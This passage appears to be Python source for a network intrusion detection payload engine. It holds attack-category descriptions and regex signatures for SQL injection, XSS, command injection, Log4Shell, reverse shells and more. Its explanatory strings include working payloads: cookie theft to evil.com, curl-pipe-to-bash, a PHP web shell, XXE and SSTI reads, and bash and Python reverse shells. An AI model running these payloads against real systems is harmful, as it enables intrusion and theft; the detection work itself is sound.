"""
payload_engine.py
=================
NIDS Payload Detection & Extraction Engine
------------------------------------------

Plugs directly into the existing pipeline:
  packet_capture.py → normalization.py → detection.py
                                             ↑
                              this module is called from here

HOW TO INTEGRATE:
  In detection.py DetectionEngine.process_packet(), after the existing
  advanced_detector.detect_attack() call, add:

      from payload_engine import PayloadEngine
      payload_alerts = self.payload_engine.analyze(packet_info)
      alerts.extend(payload_alerts)

  And in DetectionEngine.__init__():
      self.payload_engine = PayloadEngine()

WHAT IT DETECTS (17 payload categories):
  1.  SQL Injection          — DB query manipulation
  2.  XSS                    — Script injection into pages
  3.  Command Injection       — OS shell execution
  4.  Path Traversal          — Directory escape attacks
  5.  File Upload Attack      — Malicious file/shell upload
  6.  XML/XXE Injection       — XML entity exploitation
  7.  LDAP Injection          — Directory service attacks
  8.  SSTI                    — Server-Side Template Injection
  9.  Deserialization Attack  — Java/Python/PHP object exploit
  10. Log4Shell (Log4j)       — JNDI injection (CVE-2021-44228)
  11. Shellcode               — Binary exploit payloads
  12. Malware/Binary Transfer — PE/ELF/macro executables in transit
  13. Credential Exposure     — Passwords, API keys, tokens in cleartext
  14. Data Exfiltration        — Large/encoded outbound transfers
  15. Encoding Evasion         — Bypass attempts via encoding
  16. Reverse Shell Payload    — Netcat/bash/python reverse shells
  17. Protocol Anomaly         — HTTP smuggling, header attacks

ALERT FORMAT (compatible with existing NIDS alert format):
  {
    "type":         str,   # e.g. "SQL Injection"
    "rule_name":    str,   # same as type
    "severity":     str,   # CRITICAL / HIGH / MEDIUM / LOW
    "source":       str,   # src IP
    "target":       str,   # dst IP
    "dst_port":     int,
    "protocol":     str,
    "confidence":   float, # 0–100
    "layer":        str,   # "Payload"
    "payload_excerpt": str, # first 120 chars of matched payload
    "matched_patterns": list[str],
    "category":     str,   # payload category
    "timestamp":    float,
  }

Author: NIDS Payload Engine
Date:   2026-03-27
"""

import re
import time
import base64
import binascii
import logging
import hashlib
import struct
from collections import defaultdict, deque
from typing import List, Dict, Tuple, Optional
from urllib.parse import unquote, unquote_plus

logger = logging.getLogger("PayloadEngine")


# ═══════════════════════════════════════════════════════════════════
#  SECTION 1 — PAYLOAD CATEGORY REGISTRY
#  Each category: name, severity, description, real-world examples
# ═══════════════════════════════════════════════════════════════════

PAYLOAD_CATEGORIES = {
    "SQL_INJECTION": {
        "severity": "CRITICAL",
        "description": (
            "SQL Injection manipulates backend database queries by injecting "
            "malicious SQL syntax into user-supplied input. Attackers can dump "
            "entire databases, bypass authentication ('OR 1=1'), delete tables, "
            "or execute OS commands via xp_cmdshell. Used in >65% of web app breaches."
        ),
        "real_world_examples": [
            "Equifax 2017 — Apache Struts SQLi → 147M records stolen",
            "Yahoo 2012 — SQLi → 450K plaintext passwords dumped",
            "Sony Pictures 2011 — SQLi → 1M user records",
            "Heartland Payment Systems 2008 — SQLi → 130M card numbers",
        ],
        "how_it_works": (
            "Attacker sends: username=' OR '1'='1 which turns the SQL query "
            "SELECT * FROM users WHERE user='' OR '1'='1' — always true → login bypass. "
            "UNION SELECT appends a second query to dump another table. "
            "SLEEP(5) checks if blind injection is possible."
        ),
    },
    "XSS": {
        "severity": "HIGH",
        "description": (
            "Cross-Site Scripting injects malicious JavaScript into pages viewed "
            "by other users. Stored XSS persists in the database; Reflected XSS "
            "lives in a URL. Used to steal session cookies, redirect users, log "
            "keystrokes, or deploy drive-by malware downloads."
        ),
        "real_world_examples": [
            "British Airways 2018 — XSS-based card skimmer → 500K card details stolen",
            "eBay 2015 — Stored XSS in listings → redirected buyers to phishing",
            "Samy Worm 2005 — MySpace XSS → 1M accounts compromised in 20 hours",
            "TweetDeck 2014 — XSS worm auto-retweeted from 38,000 accounts",
        ],
        "how_it_works": (
            "<script>document.location='https://evil.com?c='+document.cookie</script> "
            "When this is stored and served back, victim's browser executes it, "
            "sending their session cookie to the attacker."
        ),
    },
    "COMMAND_INJECTION": {
        "severity": "CRITICAL",
        "description": (
            "Command Injection executes arbitrary OS commands on the server by "
            "injecting shell metacharacters (|, ;, &&) into application inputs. "
            "Gives full server control, file access, reverse shell capability, "
            "and lateral movement within the network."
        ),
        "real_world_examples": [
            "Shellshock 2014 (CVE-2014-6271) — Bash env variable injection → millions of servers",
            "Cisco ASA 2019 (CVE-2019-1610) — Web UI command injection → RCE",
            "F5 BIG-IP 2022 (CVE-2022-1388) — iControl REST command injection",
            "VMware vCenter 2021 (CVE-2021-21985) — vSphere Client RCE",
        ],
        "how_it_works": (
            "ping 127.0.0.1; cat /etc/passwd — The semicolon chains commands. "
            "After ping runs, the shell also runs cat /etc/passwd, leaking credentials. "
            "$(curl evil.com/shell.sh|bash) downloads and executes a remote payload."
        ),
    },
    "PATH_TRAVERSAL": {
        "severity": "HIGH",
        "description": (
            "Path Traversal escapes the web root using ../ sequences to read "
            "arbitrary files like /etc/passwd, private keys, config files with "
            "database credentials, or source code. Often combined with LFI "
            "(Local File Inclusion) for code execution."
        ),
        "real_world_examples": [
            "Pulse Secure VPN 2019 (CVE-2019-11510) — ../ read arbitrary files",
            "Citrix ADC 2019 (CVE-2019-19781) — Path traversal → RCE on 80,000 servers",
            "Fortinet SSL VPN 2018 (CVE-2018-13379) — /../../ leak VPN credentials",
            "Apache HTTP 2.4.49 (CVE-2021-41773) — Normalized path traversal → RCE",
        ],
        "how_it_works": (
            "/download?file=../../../../etc/passwd — server joins the web root "
            "with this path, resolving to /etc/passwd. Null bytes (%00) can "
            "truncate extensions: file.php%00.jpg reads file.php."
        ),
    },
    "FILE_UPLOAD_ATTACK": {
        "severity": "CRITICAL",
        "description": (
            "Malicious file upload bypasses file type checks to plant web shells, "
            "backdoors, or malware on the server. Once a PHP/JSP/ASP shell is "
            "uploaded it provides persistent remote code execution on every request."
        ),
        "real_world_examples": [
            "WordPress plugin vulns routinely allow PHP shell upload → full site takeover",
            "Apache Struts 2017 (CVE-2017-5638) — file upload → Equifax breach",
            "Drupalgeddon2 2018 (CVE-2018-7600) — File inclusion → server takeover",
            "ColdFusion 2023 (CVE-2023-26360) — File upload bypass → government sites",
        ],
        "how_it_works": (
            "<?php system($_GET['cmd']); ?> saved as shell.php.jpg or shell.php%00.jpg. "
            "Then GET /uploads/shell.php?cmd=id executes any OS command. "
            "Java: Runtime.getRuntime().exec() gives same capability in JSP."
        ),
    },
    "XML_XXE": {
        "severity": "HIGH",
        "description": (
            "XML External Entity injection forces the XML parser to load external "
            "resources. Attackers read local files (/etc/passwd), probe internal "
            "network services (SSRF), or trigger denial-of-service (Billion Laughs "
            "attack). Affects any service parsing XML input."
        ),
        "real_world_examples": [
            "Facebook 2014 — XXE in Word document parsing → internal server access",
            "Uber 2016 — XXE in SAML auth → internal file read",
            "PayPal 2013 — XXE via PDF parser → sensitive file disclosure",
            "Android FTP Server (multiple CVEs) — XXE in media metadata",
        ],
        "how_it_works": (
            "<!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><x>&xxe;</x> "
            "The SYSTEM keyword tells the parser to fetch the file URI. "
            "For SSRF: SYSTEM 'http://169.254.169.254/latest/meta-data/' reads AWS metadata."
        ),
    },
    "LDAP_INJECTION": {
        "severity": "HIGH",
        "description": (
            "LDAP Injection manipulates LDAP queries used for authentication "
            "and directory lookups. Attackers bypass login (username=*)(*)(|), "
            "extract user listings, or escalate privileges in Active Directory "
            "environments."
        ),
        "real_world_examples": [
            "Multiple corporate SSO bypasses via LDAP auth injection",
            "CVE-2021-44228 Log4Shell used LDAP as delivery vector",
            "Active Directory environments regularly exploited via LDAP filter manipulation",
        ],
        "how_it_works": (
            "username=*)(|(password=* — closes the LDAP filter early and adds "
            "OR condition, making the query always true → authentication bypass. "
            "username=admin)(&(objectClass=*) dumps all objects."
        ),
    },
    "SSTI": {
        "severity": "CRITICAL",
        "description": (
            "Server-Side Template Injection exploits template engines (Jinja2, "
            "Twig, Freemarker, Velocity) that render user input as code. Leads "
            "directly to RCE — attacker can execute any Python/Java/PHP code "
            "with server privileges."
        ),
        "real_world_examples": [
            "Uber 2016 — Jinja2 SSTI in Flask app → full server compromise",
            "HackerOne bug bounty programs regularly get SSTI reports on modern web apps",
            "CVE-2019-3396 — Atlassian Confluence SSTI → RCE on 600K servers",
            "CVE-2022-22965 — Spring4Shell — template injection variant",
        ],
        "how_it_works": (
            "Input {{7*7}} renders as 49 in Jinja2 — confirms SSTI. "
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}} "
            "executes OS commands. Freemarker: <#assign ex='freemarker.template.utility"
            ".Execute'?new()>${ex('id')}"
        ),
    },
    "DESERIALIZATION": {
        "severity": "CRITICAL",
        "description": (
            "Insecure deserialization of attacker-controlled objects leads to RCE "
            "when the application deserializes malicious data. Java, Python pickle, "
            "PHP unserialize, and .NET BinaryFormatter are common victims. "
            "The exploit works without authentication in many cases."
        ),
        "real_world_examples": [
            "Apache Commons Collections 2015 — Java deserialization → WebLogic/JBoss RCE",
            "Log4Shell 2021 — JNDI deserialization → 44% of corporate networks affected",
            "Ruby on Rails 2013 (CVE-2013-0156) — YAML deserialization → GitHub affected",
            "PHP Phar deserialization — TYPO3, Drupal, WordPress RCE variants",
        ],
        "how_it_works": (
            "Java: rO0AB... (base64 of aced0005 magic bytes) is a serialized Java object. "
            "Python: pickle.loads(data) can call __reduce__ to execute os.system(). "
            "PHP: unserialize() triggers __wakeup() magic method with attacker data."
        ),
    },
    "LOG4SHELL": {
        "severity": "CRITICAL",
        "description": (
            "Log4Shell (CVE-2021-44228) is a critical zero-day in Apache Log4j. "
            "Any logged string containing ${jndi:ldap://attacker.com/x} triggers "
            "Log4j to make an outbound LDAP/RMI request and execute the returned "
            "Java class. Affected 44% of global corporate networks within 72 hours."
        ),
        "real_world_examples": [
            "CVE-2021-44228 — Apache Log4j 2 — CVSS 10.0 — Patch Tuesday 2021",
            "Belgian Ministry of Defense — Log4Shell exploitation Dec 2021",
            "VMware, Cisco, Microsoft, Amazon — all emergency-patched within days",
            "Conti ransomware group — weaponized Log4Shell within 5 days of disclosure",
        ],
        "how_it_works": (
            "${jndi:ldap://evil.com/exploit} — when Log4j logs this string, it "
            "resolves the JNDI lookup, contacts attacker's LDAP server, downloads "
            "a Java class, and executes it in the JVM. Variants: ${jndi:rmi://}, "
            "${jndi:dns://}, obfuscated: ${${lower:j}ndi:...}"
        ),
    },
    "SHELLCODE": {
        "severity": "CRITICAL",
        "description": (
            "Shellcode is raw machine-code bytes embedded in network traffic, "
            "typically delivered via buffer overflow exploits. Contains NOP sleds "
            "followed by payload code to spawn a shell or download malware. "
            "Found in exploit kits, memory corruption attacks, and ROP chains."
        ),
        "real_world_examples": [
            "EternalBlue (MS17-010) — SMB shellcode → WannaCry/NotPetya delivery",
            "EternalRomance — SMB shellcode used by NSA and leaked by Shadow Brokers",
            "HeapSpray attacks — JavaScript fills heap with shellcode before triggering",
            "Adobe Reader exploits — PDF-embedded shellcode via heap overflow",
        ],
        "how_it_works": (
            "NOP sled: 0x90909090... followed by actual shellcode bytes. "
            "The overflow overwrites return address to point into the NOP sled, "
            "which slides execution into the shellcode. x86 shellcode often starts "
            "with \\xeb\\x... (JMP SHORT) or \\x31\\xc0 (XOR EAX,EAX)."
        ),
    },
    "MALWARE_TRANSFER": {
        "severity": "CRITICAL",
        "description": (
            "Detection of executable files (PE/ELF/Mach-O), malicious scripts, "
            "or macro-laden Office documents in network traffic. Indicates malware "
            "download, C2 payload delivery, lateral movement tools, or ransomware "
            "deployment across the network."
        ),
        "real_world_examples": [
            "Emotet — Macro-laden Word docs delivered via email attachments",
            "WannaCry — PE executable spread via SMB EternalBlue",
            "Cobalt Strike beacons — PE shellcode loaders sent over HTTPS",
            "Njrat/DarkComet RATs — EXE download triggered by phishing links",
        ],
        "how_it_works": (
            "PE header: MZ (4D 5A) followed by PE\\0\\0 at offset in the header. "
            "ELF header: \\x7fELF (7F 45 4C 46). These magic bytes identify "
            "executables regardless of filename extension or Content-Type header."
        ),
    },
    "CREDENTIAL_EXPOSURE": {
        "severity": "HIGH",
        "description": (
            "Detection of credentials, API keys, tokens, or secrets transmitted "
            "in cleartext or easily-decoded form over the network. Affects HTTP "
            "Basic Auth, hardcoded API keys in requests, session tokens in URLs, "
            "and AWS/GCP/Azure credentials in plain HTTP traffic."
        ),
        "real_world_examples": [
            "Twitch 2021 leak — 125GB including API keys and source code exposed",
            "Samsung 2022 — AWS keys hardcoded in Galaxy App source code",
            "Uber 2022 — Hardcoded credentials in internal tools → full breach",
            "Toyota 2023 — GitHub repo with cloud API key → 2.15M customers affected",
        ],
        "how_it_works": (
            "HTTP Basic Auth sends base64(user:pass) in every request header. "
            "Authorization: Basic dXNlcjpwYXNz decodes to user:pass. "
            "AWS keys: AKIA followed by 16 uppercase chars. "
            "JWT tokens in URLs persist in access logs."
        ),
    },
    "DATA_EXFILTRATION": {
        "severity": "HIGH",
        "description": (
            "Detection of unusually large data transfers, DNS tunneling, ICMP "
            "tunneling, or encoded data streams leaving the network. Attackers "
            "exfiltrate data via DNS TXT records, HTTPS to C2 servers, or large "
            "HTTP POST requests to avoid detection."
        ),
        "real_world_examples": [
            "SolarWinds 2020 — SUNBURST used DNS tunneling for C2 communication",
            "APT29 — Encoded data in HTTP headers to blend with normal traffic",
            "Lazarus Group — Large encrypted archives sent to cloud storage",
            "Capital One 2019 — AWS metadata exfiltration via SSRF",
        ],
        "how_it_works": (
            "DNS tunneling: encode data as subdomain labels (base64encoded.attacker.com). "
            "The response carries C2 commands. Iodine and DNSCat2 automate this. "
            "ICMP tunneling: data embedded in echo request payload (Ptunnel, ICMPSH)."
        ),
    },
    "ENCODING_EVASION": {
        "severity": "MEDIUM",
        "description": (
            "Detection of encoded payloads designed to bypass WAF and IDS rules. "
            "Includes URL encoding (%3cscript%3e), double encoding (%253c), "
            "Unicode normalization (＜script＞), Base64 blobs, hex strings, "
            "and Unicode homoglyph substitution attacks."
        ),
        "real_world_examples": [
            "ModSecurity bypass via UTF-8 overlong encoding",
            "CloudFlare WAF bypass via Unicode normalization XSS",
            "AWS WAF bypass 2021 — JSON parsing inconsistency with double encoding",
            "Imperva bypass — chunked encoding + comment injection",
        ],
        "how_it_works": (
            "%3cscript%3e URL-decodes to <script>. %253c double-encodes %3c. "
            "Server decodes twice → final <script> bypasses single-decode WAF. "
            "\\u003cscript\\u003e is JavaScript unicode for <script>."
        ),
    },
    "REVERSE_SHELL": {
        "severity": "CRITICAL",
        "description": (
            "Reverse shell payloads cause the victim server to initiate an outbound "
            "connection back to the attacker, bypassing inbound firewall rules. "
            "Common in post-exploitation after RCE. Indicators include netcat, "
            "bash TCP redirects, Python socket payloads, and Meterpreter stagers."
        ),
        "real_world_examples": [
            "Cobalt Strike — CS beacon is the industry-standard reverse shell framework",
            "Metasploit Meterpreter — encrypted reverse shell used in 90% of pen tests",
            "GoAnywhere MFT 2023 (CVE-2023-0669) — reverse shell planted on 130 orgs",
            "MOVEit Transfer 2023 (CVE-2023-34362) — web shell → reverse shell",
        ],
        "how_it_works": (
            "bash -i >& /dev/tcp/attacker.com/4444 0>&1 — redirects bash I/O "
            "to a TCP socket. python -c 'import socket,os,pty;s=socket.socket();"
            "s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0)' — Python variant. "
            "These appear as HTTP POST bodies or command injection payloads."
        ),
    },
    "PROTOCOL_ANOMALY": {
        "severity": "MEDIUM",
        "description": (
            "Detection of HTTP request smuggling, header injection, CRLF injection, "
            "host header attacks, and protocol-level anomalies used to bypass "
            "security controls, poison caches, perform SSRF, or access internal "
            "endpoints by confusing reverse proxies."
        ),
        "real_world_examples": [
            "HTTP Request Smuggling — PortSwigger research → Netflix, PayPal bypasses",
            "CRLF Injection — used to inject fake HTTP headers and split responses",
            "Host Header Attack — internal service discovery via Apache mod_rewrite",
            "CVE-2023-25690 — Apache HTTP mod_proxy request smuggling",
        ],
        "how_it_works": (
            "Transfer-Encoding: chunked vs Content-Length discrepancy between "
            "frontend proxy and backend server. Frontend sees one request; "
            "backend sees two. The attacker's second hidden request is processed "
            "with the next user's credentials attached."
        ),
    },
}


# ═══════════════════════════════════════════════════════════════════
#  SECTION 2 — SIGNATURE DEFINITIONS PER CATEGORY
# ═══════════════════════════════════════════════════════════════════

class _Signatures:
    """All regex/byte/keyword signature definitions."""

    # ── SQL Injection ──────────────────────────────────────────────
    SQL = {
        "UNION SELECT":       (r"union\s+(?:all\s+)?select",         30),
        "OR 1=1 bypass":      (r"'\s*or\s+'?1'?\s*=\s*'?1",         30),
        "AND 1=1 bypass":     (r"'\s*and\s+'?1'?\s*=\s*'?1",        25),
        "stacked queries":    (r";\s*(?:drop|insert|update|delete|create|alter)\s", 35),
        "SLEEP time-based":   (r"(?:sleep|benchmark|pg_sleep|waitfor\s+delay)\s*\(", 35),
        "UNION dump":         (r"union.{0,20}select.{0,60}from",     35),
        "comment terminate":  (r"(?:--\s*$|#\s*$|/\*.*?\*/)",        20),
        "error-based":        (r"(?:extractvalue|updatexml|floor\(rand)", 30),
        "blind boolean":      (r"(?:and|or)\s+\d+\s*[<>=!]+\s*\d+", 20),
        "schema dump":        (r"information_schema|sysobjects|sys\.tables|pg_tables", 30),
        "hex encode bypass":  (r"0x[0-9a-f]{6,}",                   15),
        "CHAR() encode":      (r"char\s*\(\s*\d+\s*(?:,\s*\d+\s*)+\)", 20),
        "xp_cmdshell":        (r"xp_cmdshell|exec\s+master",         40),
        "INTO OUTFILE":       (r"into\s+(?:outfile|dumpfile)",        35),
        "LOAD_FILE":          (r"load_file\s*\(",                    30),
    }

    # ── XSS ───────────────────────────────────────────────────────
    XSS = {
        "script tag":         (r"<\s*script[^>]*>",                  35),
        "javascript: proto":  (r"javascript\s*:",                    30),
        "onerror handler":    (r"\bonerror\s*=",                     30),
        "onload handler":     (r"\bonload\s*=",                      30),
        "onclick handler":    (r"\bonclick\s*=",                     25),
        "onmouseover":        (r"\bonmouseover\s*=",                 25),
        "onfocus handler":    (r"\bonfocus\s*=",                     25),
        "data: URI":          (r"data\s*:\s*text/html",              25),
        "innerHTML assign":   (r"innerHTML\s*=",                     25),
        "eval() call":        (r"\beval\s*\(",                       30),
        "document.cookie":    (r"document\.cookie",                  35),
        "document.write":     (r"document\.write\s*\(",              25),
        "iframe injection":   (r"<\s*iframe[^>]*src\s*=",            30),
        "SVG xss":            (r"<\s*svg[^>]*onload\s*=",            30),
        "img onerror":        (r"<\s*img[^>]*onerror\s*=",           30),
        "vbscript: proto":    (r"vbscript\s*:",                      30),
        "XSS entity encode":  (r"&(?:#\d+|#x[0-9a-f]+|lt|gt|amp|quot);.*script", 25),
        "template literal":   (r"`[^`]*\$\{[^}]*\}",                20),
    }

    # ── Command Injection ──────────────────────────────────────────
    CMD = {
        "pipe shell":         (r"\|\s*(?:cat|ls|id|whoami|wget|curl|sh|bash|python|perl|nc|ncat|netcat)\b", 40),
        "semicolon chain":    (r";\s*(?:cat|ls|id|whoami|wget|curl|sh|bash|python|perl|nc)\b", 40),
        "AND chain":          (r"&&\s*(?:cat|ls|id|whoami|wget|curl|sh|bash|python)\b", 40),
        "OR chain":           (r"\|\|\s*(?:cat|ls|id|whoami|wget|curl|sh|bash)\b", 35),
        "backtick exec":      (r"`[^`]{3,80}`",                      35),
        "$(subshell)":        (r"\$\([^)]{3,80}\)",                  35),
        "rm -rf":             (r"\brm\s+-rf\b",                      45),
        "wget download":      (r"\bwget\s+(?:http|ftp|//)",          40),
        "curl download":      (r"\bcurl\s+(?:-[a-zA-Z]+\s+)*(?:http|ftp|//)", 35),
        "python -c exec":     (r"\bpython\s+-c\s+['\"]",             40),
        "bash -i":            (r"\bbash\s+-i\b",                     45),
        "sh -c exec":         (r"\bsh\s+-c\s+['\"]",                 40),
        "/etc/passwd read":   (r"cat\s+/etc/(?:passwd|shadow|hosts|group)", 45),
        "id command":         (r"\bid\s*;|\bid\s*\||;\s*id\b",       35),
        "chmod exploit":      (r"\bchmod\s+[0-9]{3,4}\s+",          30),
        "base64 decode exec": (r"base64\s+-d\s*\|",                  40),
        "perl -e":            (r"\bperl\s+-e\s+['\"]",               40),
    }

    # ── Path Traversal ─────────────────────────────────────────────
    PATH = {
        "unix traversal":     (r"\.\./\.\./",                        35),
        "windows traversal":  (r"\.\.\\\.\.\\",                      35),
        "encoded traversal":  (r"%2e%2e[/%5c]",                      35),
        "double encoded":     (r"%252e%252e",                        40),
        "unicode traversal":  (r"\.\./|\.\.",                        20),
        "/etc/passwd":        (r"/etc/(?:passwd|shadow|group|hosts|crontab)", 45),
        "win system32":       (r"(?:windows|winnt)[/\\]system32",    40),
        "null byte truncate": (r"%00\.",                             35),
        "web.xml access":     (r"/WEB-INF/web\.xml",                 45),
        "proc/self/":         (r"/proc/self/(?:environ|cmdline|fd)", 40),
        "app config":         (r"(?:config\.php|config\.ini|\.env|web\.config)\b", 35),
        "private key":        (r"\.ssh/id_(?:rsa|ecdsa|ed25519)",    45),
        "backup files":       (r"\.(bak|backup|old|orig|swp|tmp)$",  25),
        "nginx config":       (r"/etc/nginx/|/etc/apache2/",         35),
    }

    # ── File Upload Attack ──────────────────────────────────────────
    UPLOAD = {
        "PHP shell":          (r"<\?php\s+(?:system|exec|shell_exec|passthru|popen)\s*\(", 50),
        "PHP eval":           (r"<\?php\s+eval\s*\(\s*\$",          50),
        "PHP short tag":      (r"<\?=\s*(?:system|shell_exec)\s*\(", 50),
        "JSP shell":          (r"<%.*?Runtime\.getRuntime\(\)\.exec", 50),
        "JSP import":         (r"<%@\s*page\s+import\s*=.*?Runtime", 45),
        "ASP shell":          (r"<%.*?(?:CreateObject|WScript\.Shell)", 45),
        "Python wsgi":        (r"import\s+os.*?subprocess|from\s+subprocess\s+import", 35),
        "PHP webshell base64":(r"<\?php.*?base64_decode.*?eval",     50),
        "CFML shell":         (r"<cfexecute\s+name\s*=",             45),
        "server-side JS":     (r"require\s*\(\s*['\"]child_process['\"]", 40),
        "Perl CGI shell":     (r"use\s+CGI;.*?system\s*\(",          40),
    }

    # ── XML / XXE ──────────────────────────────────────────────────
    XML = {
        "DOCTYPE entity":     (r"<!DOCTYPE\s+[^>]*\[",               35),
        "SYSTEM entity":      (r"<!ENTITY\s+\w+\s+SYSTEM\s+['\"]",  45),
        "PUBLIC entity":      (r"<!ENTITY\s+\w+\s+PUBLIC\s+",        40),
        "file:// entity":     (r"SYSTEM\s+['\"]file://",             50),
        "http:// entity":     (r"SYSTEM\s+['\"]https?://",           45),
        "SSRF via XXE":       (r"SYSTEM\s+['\"]https?://169\.254",   50),
        "billion laughs":     (r"<!ENTITY\s+\w+\s+['\"]&\w+;&\w+;", 45),
        "XInclude":           (r"xmlns:xi\s*=.*?xi:include",         40),
        "SOAP injection":     (r"<\!\[CDATA\[.*?<script",            35),
    }

    # ── LDAP Injection ─────────────────────────────────────────────
    LDAP = {
        "wildcard bypass":    (r"\*\)\s*\(",                         40),
        "filter bypass":      (r"\*\)\(&\(",                         45),
        "null auth bypass":   (r"\)\s*\|\s*\(",                      35),
        "objectClass dump":   (r"\(\s*objectClass\s*=\s*\*\s*\)",    40),
        "attribute inject":   (r"cn\s*=\s*\*\s*\)",                  35),
    }

    # ── SSTI ───────────────────────────────────────────────────────
    SSTI = {
        "Jinja2 eval":        (r"\{\{[^}]+\}\}",                     35),
        "Jinja2 globals":     (r"\{\{.*?__class__.*?__mro__",        50),
        "Jinja2 OS":          (r"\{\{.*?config.*?os\.popen",         50),
        "Twig exec":          (r"\{\{.*?_self\.env.*?exec\(",        50),
        "Freemarker exec":    (r"<#assign.*?freemarker.*?Execute",    50),
        "Velocity exec":      (r"#set.*?\$class\.forName",           45),
        "Smarty exec":        (r"\{php\}.*?system\(",                50),
        "Django debug":       (r"\{%.*?debug.*?%\}",                 30),
        "Handlebars proto":   (r"\{\{.*?__proto__",                  45),
        "Pebble exec":        (r"\{%.*?invoke.*?exec",               45),
        "Ruby ERB":           (r"<%=.*?system\(",                    50),
        "arithmetic probe":   (r"\{\{[^}]*[0-9]+\s*\*\s*[0-9]+[^}]*\}\}", 25),
    }

    # ── Deserialization ────────────────────────────────────────────
    DESER_MAGIC_BYTES = [
        (b"\xac\xed\x00\x05", "Java serialized object (aced0005)"),
        (b"\xca\xfe\xba\xbe", "Java class file (cafebabe)"),
        (b"\x80\x03",         "Python pickle protocol 3"),
        (b"\x80\x04",         "Python pickle protocol 4"),
        (b"\x80\x05",         "Python pickle protocol 5"),
        (b"O:8:",              "PHP object serialize O:"),
        (b"a:1:",              "PHP array serialize a:"),
        (b"s:1:",              "PHP string serialize s:"),
        (b"AAEAAAD",           ".NET BinaryFormatter base64"),
        (b"rO0AB",             "Java serialized base64 (rO0AB)"),
        (b"H4sI",              "Gzip-compressed payload (H4sI)"),
    ]
    DESER_PATTERNS = {
        "Java RMI payload":   (r"rmi://[a-z0-9.:-]+/",              45),
        "JNDI lookup":        (r"jndi:[^}]{3,100}",                  50),
        "Ysoserial gadget":   (r"org\.apache\.commons\.collections",  40),
        "Spring4Shell":       (r"class\.module\.classLoader",         50),
        "PHP unserialize":    (r'O:\d+:"[a-zA-Z_]',                  40),
    }

    # ── Log4Shell ─────────────────────────────────────────────────
    LOG4SHELL = {
        "JNDI basic":         (r"\$\{jndi:",                         60),
        "JNDI LDAP":          (r"\$\{jndi:ldap[s]?://",             65),
        "JNDI RMI":           (r"\$\{jndi:rmi://",                   65),
        "JNDI DNS":           (r"\$\{jndi:dns://",                   60),
        "JNDI CORBA":         (r"\$\{jndi:(?:corba|iiop|iiiop)://", 60),
        "obfuscated lower":   (r"\$\{(?:lower|upper):\w\}",          35),
        "obfuscated nested":  (r"\$\{\$\{.*?\}",                     40),
        "header injection":   (r"X-API-Version:.*?\$\{jndi",         65),
        "Log4j2 bypass":      (r"\$\{(?:env|sys|java|main|marker|sd|ctx|mdc|ndc|thread|log4j):", 35),
    }

    # ── Shellcode Patterns ─────────────────────────────────────────
    SHELLCODE_NOP_SLEDS = [b"\x90" * 16, b"\x90" * 8]
    SHELLCODE_PATTERNS = {
        "NOP sled":           (r"(?:\\x90){8,}",                     40),
        "x86 INT3":           (r"(?:\\xcc){3,}",                     35),
        "JMP SHORT":          (r"\\xeb(?:\\x[0-9a-f]{2}){3,}",      35),
        "XOR EAX prologue":   (r"\\x31\\xc0",                        30),
        "PUSH ESP/POP EBP":   (r"\\x54\\x5d",                        25),
        "calc shellcode":     (r"\\x31\\xd2\\x52\\x68\\x63\\x61\\x6c\\x63", 50),
        "CALL/POP technique": (r"\\xe8\\x00\\x00\\x00\\x00\\x5[a-f]", 40),
    }

    # ── Malware/Binary Transfer ────────────────────────────────────
    BINARY_MAGIC = [
        (b"\x4d\x5a",         "Windows PE (MZ header)"),
        (b"\x50\x45\x00\x00", "Windows PE32 internal"),
        (b"\x7f\x45\x4c\x46", "Linux ELF"),
        (b"\xfe\xed\xfa\xce", "macOS Mach-O 32-bit"),
        (b"\xfe\xed\xfa\xcf", "macOS Mach-O 64-bit"),
        (b"\xce\xfa\xed\xfe", "macOS Mach-O 32-bit LE"),
        (b"\xcf\xfa\xed\xfe", "macOS Mach-O 64-bit LE"),
        (b"\xd0\xcf\x11\xe0", "Microsoft Office OLE2 (doc/xls/ppt)"),
        (b"\x50\x4b\x03\x04", "ZIP archive (OOXML Office/docx)"),
    ]
    SCRIPT_PATTERNS = {
        "PowerShell encoded": (r"powershell\s+(?:-[eE]ncoded[cC]ommand|-[eE][cC])\s+[A-Za-z0-9+/=]{20,}", 50),
        "PowerShell bypass":  (r"powershell\s+.*?-[eE]xecution[pP]olicy\s+[bB]ypass", 45),
        "macro dropper":      (r"AutoOpen|Document_Open|Workbook_Open", 40),
        "VBA shell":          (r"Shell\s*\(\s*['\"](?:cmd|powershell|wscript)", 45),
        "mshta download":     (r"\bmshta\b.*?http",                  50),
        "regsvr32 comserver": (r"\bregsvr32\s+/s\s+/u\s+/i:http",  50),
        "certutil decode":    (r"\bcertutil\b.*?-(?:decode|urlcache)", 45),
        "bitsadmin":          (r"\bbitsadmin\b.*?/transfer",         45),
    }

    # ── Credential Exposure ────────────────────────────────────────
    CRED = {
        "HTTP Basic Auth":    (r"Authorization:\s*Basic\s+[A-Za-z0-9+/=]{10,}", 30),
        "Bearer token":       (r"Authorization:\s*Bearer\s+[A-Za-z0-9._-]{20,}", 25),
        "AWS Access Key":     (r"AKIA[0-9A-Z]{16}",                  50),
        "AWS Secret Key":     (r"(?:aws_secret|secret_key)\s*[=:]\s*[A-Za-z0-9/+]{40}", 50),
        "password in URL":    (r"(?:password|passwd|pwd)\s*=\s*[^&\s]{6,}", 35),
        "API key in URL":     (r"(?:api[_-]?key|apikey|access_token)\s*=\s*[a-zA-Z0-9_-]{20,}", 35),
        "GCP service key":    (r'"type":\s*"service_account"',        45),
        "private SSH key":    (r"-----BEGIN\s+(?:RSA|EC|OPENSSH)\s+PRIVATE\s+KEY-----", 50),
        "JWT token":          (r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}", 25),
        "Slack token":        (r"xox[bpoa]-[0-9]{10,}",              45),
        "GitHub token":       (r"gh[pousr]_[A-Za-z0-9]{36}",         50),
        "Stripe secret":      (r"sk_(?:live|test)_[A-Za-z0-9]{24,}", 50),
        "Twilio secret":      (r"SK[a-f0-9]{32}",                   45),
    }

    # ── Data Exfiltration ──────────────────────────────────────────
    EXFIL = {
        "DNS tunnel subdomain":(r"[a-z0-9]{20,}\.[a-z0-9]+\.[a-z]{2,}", 25),
        "base64 large blob":  (r"[A-Za-z0-9+/]{200,}={0,2}",        25),
        "hex dump large":     (r"[0-9a-f]{300,}",                    25),
        "multipart boundary": (r"Content-Disposition: form-data.*?filename=", 15),
